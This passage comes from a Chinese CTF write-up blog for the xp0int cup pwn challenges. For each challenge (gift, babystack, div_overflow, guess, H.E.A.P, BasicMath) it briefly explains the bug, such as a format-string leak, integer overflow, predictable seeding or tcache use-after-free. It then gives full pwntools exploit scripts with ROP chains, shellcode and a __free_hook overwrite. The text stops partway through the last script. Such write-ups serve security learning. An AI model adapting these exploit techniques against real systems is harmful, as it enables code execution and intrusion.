class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>, <span class=\"number\">13789</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;,&#x27;./gift&#x27;], env=&#123;&quot;LD_PRELOAD&quot;: &#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./gift&#x27;</span>)</span><br><span class=\"line\">name = <span class=\"number\">0x0000000202060</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;this the gift for you.\\n&#x27;</span>)</span><br><span class=\"line\">io.send(<span class=\"string\">&#x27;%9$p-%19$p-%11$p&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;0x&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">start_main = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">libc_base = start_main - <span class=\"number\">231</span> - libc.sym[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc_base)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">inp = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(inp)</span><br><span class=\"line\">elf.address = inp - <span class=\"number\">0x000000B78</span> - <span class=\"number\">43</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(elf.address)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = elf.address + <span class=\"number\">0x000000000000C73</span></span><br><span class=\"line\">pop_rsi = libc_base + <span class=\"number\">0x0000000000023eea</span></span><br><span class=\"line\">pop_rdx = libc_base + <span class=\"number\">0x0000000000001b96</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(pop_rdi)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(pop_rsi)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(pop_rdx)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">sc = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>)) <span class=\"comment\"># open(&quot;./flag&quot;)</span></span><br><span class=\"line\">sc += asm(shellcraft.read(<span class=\"number\">3</span>, <span class=\"number\">0x00002020cf</span> + elf.address, <span class=\"number\">0x30</span>)) <span class=\"comment\"># read(3, buf, 0x30)</span></span><br><span class=\"line\">sc += asm(shellcraft.write(<span class=\"number\">1</span>, <span class=\"number\">0x00002020cf</span> + elf.address, <span class=\"number\">0x30</span>)) <span class=\"comment\"># write(1, buf, 0x30)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(sc)</span><br><span class=\"line\"><span class=\"built_in\">print</span> sc</span><br><span class=\"line\"><span class=\"built_in\">print</span> libc.sym[<span class=\"string\">&#x27;mprotect&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p = sc</span><br><span class=\"line\">p += p64(<span class=\"number\">0</span>) + p64(pop_rdx) + p64(<span class=\"number\">0x7</span>) + p64(pop_rsi) + p64(<span class=\"number\">0x1000</span>) + p64(pop_rdi) + p64((elf.address + name) &amp; <span class=\"number\">0xffffffffff000</span>) + p64(libc.sym[<span class=\"string\">&#x27;mprotect&#x27;</span>]) + p64(elf.address + name)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(p)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;please input your name:\\n&#x27;</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x30</span> - <span class=\"number\">8</span>) + p64(canary) + p64(elf.address + name + <span class=\"built_in\">len</span>(sc)) + p64(elf.address + <span class=\"number\">0x0000000C00</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;what do you want to say?\\n&#x27;</span>)</span><br><span class=\"line\">io.send(p)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\"># flag&#123;gO</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"babystack\"><a href=\"#babystack\" class=\"headerlink\" title=\"babystack\"></a>babystack</h1><p>异构pwn耶！</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127002135923.png\" alt=\"image-20211127002135923\"></p>\n<p>保护全关</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127002336060.png\" alt=\"image-20211127002336060\"></p>\n<p>发现有一个格式化字符串漏洞，可以泄露栈地址</p>\n<p>查阅一番资料，并看汇编发现，arm架构下PC也会存放在栈上，动态调试一番就可以算到偏移量</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127002833507.png\" alt=\"image-20211127002833507\"></p>\n<p>然后再v6中编写shellcode，并跳转执行即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;qemu-arm&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>, <span class=\"number\">10008</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;I am a repeater without any emotion.\\n&#x27;</span>)</span><br><span class=\"line\">io.send(<span class=\"string\">&#x27;%1$p&#x27;</span>)</span><br><span class=\"line\">stack = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;Do you have any questions?&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(stack)</span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;arm&#x27;</span>)</span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> + p32(stack + <span class=\"number\">0x4</span> * <span class=\"number\">3</span>) + asm(shellcraft.sh())</span><br><span class=\"line\">io.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"by-Csome\"><a href=\"#by-Csome\" class=\"headerlink\" title=\"by Csome\"></a>by Csome</h1><p>!!!暨南大学xp0int杯wp收集截止前禁止发送给暨南大学的同学，产生的后果由转发者承担!!!</p>\n","excerpt":"","more":"<h1 id=\"div-overflow\"><a href=\"#div-overflow\" class=\"headerlink\" title=\"div_overflow\"></a>div_overflow</h1><h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/p/xp0intCTF-wp/image-20211126202845219.png\" alt=\"image-20211126202845219\"></p>\n<p>没开canary和PIE</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126203002459.png\" alt=\"image-20211126203002459\"></p>\n<p>init()函数发现有一个signal绑定，</p>\n<p>百度<a href=\"https://www.runoob.com/cprogramming/c-function-signal.html\">C 库函数 – signal() | 菜鸟教程 (runoob.com)</a></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126203057998.png\" alt=\"image-20211126203057998\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126203140394.png\" alt=\"image-20211126203140394\"></p>\n<p>查看glibc源码可以发现，这个是将除零溢出错误信号绑定到backdoor函数上了（就是说触发这个信号，不会报错会直接跳转到对应函数运行）</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126203309494.png\" alt=\"image-20211126203309494\"></p>\n<p>backdoor函数发现栈溢出漏洞</p>\n<h2 id=\"SIGFPE信号的触发\"><a href=\"#SIGFPE信号的触发\" class=\"headerlink\" title=\"SIGFPE信号的触发\"></a>SIGFPE信号的触发</h2><p><img src=\"/p/xp0intCTF-wp/image-20211126203459270.png\" alt=\"image-20211126203459270\"></p>\n<p>main函数过程中有一个除法运算，但需要v4不为0才能进入，那么就不能构造1&#x2F;0的形式</p>\n<p>由于计算机采用的是补码的表示方法，32位机器位可以表示的有符号整数范围为-2147483648~2,147,483,647</p>\n<p>发现构造-2147483648&#x2F;-1&#x3D;2147483648，会发生除法溢出，从而进入backdoor</p>\n<h2 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./div_overflow&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = remote(&#x27;35.229.138.83&#x27;,14056)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(<span class=\"string\">&#x27;-2147483648&#x27;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&#x27;-1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shell = <span class=\"number\">0x0004007C8</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Hero, please leave your name :&#x27;</span>)</span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x58</span> + p64(shell)</span><br><span class=\"line\">io.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"guess\"><a href=\"#guess\" class=\"headerlink\" title=\"guess\"></a>guess</h1><p><img src=\"/p/xp0intCTF-wp/image-20211126224124359.png\" alt=\"image-20211126224124359\"></p>\n<p>没有开NX，存在shellcode执行</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224156281.png\" alt=\"image-20211126224156281\"></p>\n<p>main函数调用game()，game()是主要逻辑，大概意思就是需要预测随机数，首先会使用时间播种</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224322214.png\" alt=\"image-20211126224322214\"></p>\n<p>然后随机生成16个字符，并存入s中</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224354047.png\" alt=\"image-20211126224354047\"></p>\n<p>最后需要我们输入16字符和s进行校验，校验成功就可以进入good()函数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224423086.png\" alt=\"image-20211126224423086\"></p>\n<p>IDA分析good()函数的时候报错，只能看汇编了</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126224821861.png\" alt=\"image-20211126224821861\"></p>\n<p>一通分析下来good函数就是shellcode后门，这样思路就很明确了，只需要预测随机数+shellcode</p>\n<h2 id=\"预测随机数\"><a href=\"#预测随机数\" class=\"headerlink\" title=\"预测随机数\"></a>预测随机数</h2><p>从Tover那里学来的方法，在本地写一个C程序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> seed;</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdin</span> ,<span class=\"number\">0</span>);</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;seed&gt;&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;seed);</span><br><span class=\"line\">        srand(seed);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ans&gt;&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; ++i) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>, rand() % <span class=\"number\">255</span>);</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后在服务器运行的同时运行此程序，这样就可以设置相同的seed，自然随机出来的数据就是相同的</p>\n<p>shelldoe</p>\n<h2 id=\"Exp-1\"><a href=\"#Exp-1\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">rd = process(<span class=\"string\">&#x27;./rd&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process(&#x27;./guess&#x27;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>, <span class=\"number\">16134</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">randchar</span>(<span class=\"params\">seed</span>):</span><br><span class=\"line\">    rd.recvuntil(<span class=\"string\">&#x27;seed&gt;&#x27;</span>)</span><br><span class=\"line\">    rd.sendline(<span class=\"built_in\">str</span>(seed))</span><br><span class=\"line\">    rd.recvuntil(<span class=\"string\">&#x27;ans&gt;&#x27;</span>)</span><br><span class=\"line\">    arr = rd.recvuntil(<span class=\"string\">&#x27; \\n&#x27;</span>, drop=<span class=\"literal\">True</span>).split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    arr = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, arr))</span><br><span class=\"line\">    arr = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">chr</span>, arr))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print randchar(123456)  </span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;May I have your name : &#x27;</span>, <span class=\"string\">&#x27;asdfg&#x27;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Branch hat : Now I tell you the essence of this spell is &#x27;</span>)</span><br><span class=\"line\">inp = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span> inp</span><br><span class=\"line\">p = randchar(inp)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&#x27;Please enter the spell you understand : &#x27;</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"string\">&#x27;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&#x27;</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;loud&#x27;</span>)</span><br><span class=\"line\">io.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"H-E-A-P\"><a href=\"#H-E-A-P\" class=\"headerlink\" title=\"H.E.A.P\"></a>H.E.A.P</h1><p><img src=\"/p/xp0intCTF-wp/image-20211126233747324.png\" alt=\"image-20211126233747324\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126233759571.png\" alt=\"image-20211126233759571\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126233841835.png\" alt=\"image-20211126233841835\"></p>\n<p>堆题，libc版本2.27存在tcache bin</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126233920786.png\" alt=\"image-20211126233920786\"></p>\n<p>发现漏洞，free之后没有将指针清空，利用之后可以任意地址写</p>\n<h2 id=\"Exp-2\"><a href=\"#Exp-2\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>, <span class=\"number\">11009</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;, &#x27;./chall&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx, size</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choice &gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size: &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choice &gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choice &gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choice &gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Content: &#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\">main_arena = <span class=\"number\">0x000003EBC40</span> </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    add(i, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>, <span class=\"number\">0x90</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    free(<span class=\"number\">7</span>-i)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>) <span class=\"comment\"># 泄露main_arana地址</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Content: &#x27;</span>)</span><br><span class=\"line\">inp = u64(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">libc_base = inp-<span class=\"number\">96</span>-main_arena</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0x4f3d5</span>,<span class=\"number\">0x4f432</span>,<span class=\"number\">0x10a41c</span>] <span class=\"comment\"># one gadget</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>, p64(libc_base + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>])) <span class=\"comment\"># 修改fd指针为__free_hook地址</span></span><br><span class=\"line\">add(<span class=\"number\">10</span>, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">11</span>, <span class=\"number\">0x90</span>) <span class=\"comment\"># 11号堆块在__free_hook位置</span></span><br><span class=\"line\">edit(<span class=\"number\">11</span>, p64(ogg[<span class=\"number\">1</span>]+libc_base)) <span class=\"comment\"># 在__free_hook位置写入one gadget</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"comment\"># add(12, 0x90)</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>) <span class=\"comment\"># 除法free函数，执行ogg</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>具体利用方法见<a href=\"https://blog.csdn.net/A951860555/article/details/115442780?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link\">CTF pwn题堆入门 – Tcache bin_lifanxin的博客-CSDN博客</a></p>\n<h1 id=\"BasicMath\"><a href=\"#BasicMath\" class=\"headerlink\" title=\"BasicMath\"></a>BasicMath</h1><p><img src=\"/p/xp0intCTF-wp/image-20211126234339793.png\" alt=\"image-20211126234339793\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126234403168.png\" alt=\"image-20211126234403168\"></p>\n<p>又有随机数，但这一次需要预测，直接利用python eval()计算结果就行，注意到有16个问题，当i&#x3D;&#x3D;15是，会进入last_problem函数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126234530108.png\" alt=\"image-20211126234530108\"></p>\n<p>貌似没有什么问题</p>\n<p>再仔细观察就会发现，readint返回的是64位有符号整型数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126234625584.png\" alt=\"image-20211126234625584\"></p>\n<p>但进行校验的时候，取得是v5得高32位字节判断，所以只需要最后一次输入的数比较大就行</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126234633993.png\" alt=\"image-20211126234633993\"></p>\n<p>然后就是进入gift函数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126235123293.png\" alt=\"image-20211126235123293\"></p>\n<p>发现有leak和溢出漏洞</p>\n<h2 id=\"Exp-3\"><a href=\"#Exp-3\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span 